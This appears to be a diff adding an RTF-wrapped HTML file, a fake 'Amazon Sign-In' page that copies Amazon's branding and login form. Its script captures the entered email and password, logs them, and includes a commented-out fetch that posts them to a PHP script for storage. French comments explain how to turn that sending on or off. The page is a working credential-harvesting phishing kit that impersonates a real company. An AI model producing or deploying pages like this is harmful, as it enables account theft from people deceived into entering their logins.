@@ -1,0 +1,69 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2822
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 <!DOCTYPE html>\
+<html>\
+<head>\
+  <title>Amazon Sign-In</title>\
+  <link rel="stylesheet" href="style.css">\
+</head>\
+<body>\
+  <div class="container">\
+    <img src="https://i.postimg.cc/26gK0MnT/temp-Imagerq-X4i-G.avif" alt="Amazon Logo" class="logo">\
+    <div class="login-box">\
+      <h1>Sign-In</h1>\
+      <form id="loginForm">\
+        <label for="email">Email or mobile phone number</label>\
+        <input type="text" id="email" name="email">\
+        <label for="password">Password</label>\
+        <input type="password" id="password" name="password">\
+        <button type="submit">Sign-In</button>\
+        <p><a href="#">Forgot your password?</a></p>\
+      </form>\
+      <div class="new-account">\
+        <p>New to Amazon? <a href="#">Create an Amazon account</a></p>\
+      </div>\
+    </div>\
+  </div>\
+\
+  <script>\
+    document.getElementById('loginForm').addEventListener('submit', function(event) \{\
+      event.preventDefault(); // Emp\'eache la soumission normale du formulaire\
+\
+      const email = document.getElementById('email').value;\
+      const password = document.getElementById('password').value;\
+\
+      // Affiche les informations de connexion dans la console\
+      console.log("Email:", email);\
+      console.log("Password:", password);\
+\
+      // **Supprime ou commente le code suivant si tu ne veux pas envoyer les donn\'e9es \'e0 un serveur.**\
+      /*\
+      // Envoie les donn\'e9es \'e0 un script c\'f4t\'e9 serveur (par exemple, PHP)\
+      fetch('enregistrer_donnees.php', \{ // Remplacez par l'URL de votre script PHP\
+        method: 'POST',\
+        headers: \{\
+          'Content-Type': 'application/x-www-form-urlencoded'\
+        \},\
+        body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)\
+      \})\
+      .then(response => \{\
+        if (response.ok) \{\
+          console.log('Donn\'e9es enregistr\'e9es avec succ\'e8s !');\
+        \} else \{\
+          console.error('Erreur lors de l\\'enregistrement des donn\'e9es.');\
+        \}\
+      \})\
+      .catch(error => \{\
+        console.error('Erreur de r\'e9seau:', error);\
+      \});\
+      */\
+    \});\
+  </script>\
+</body>\
+</html>\
+si}
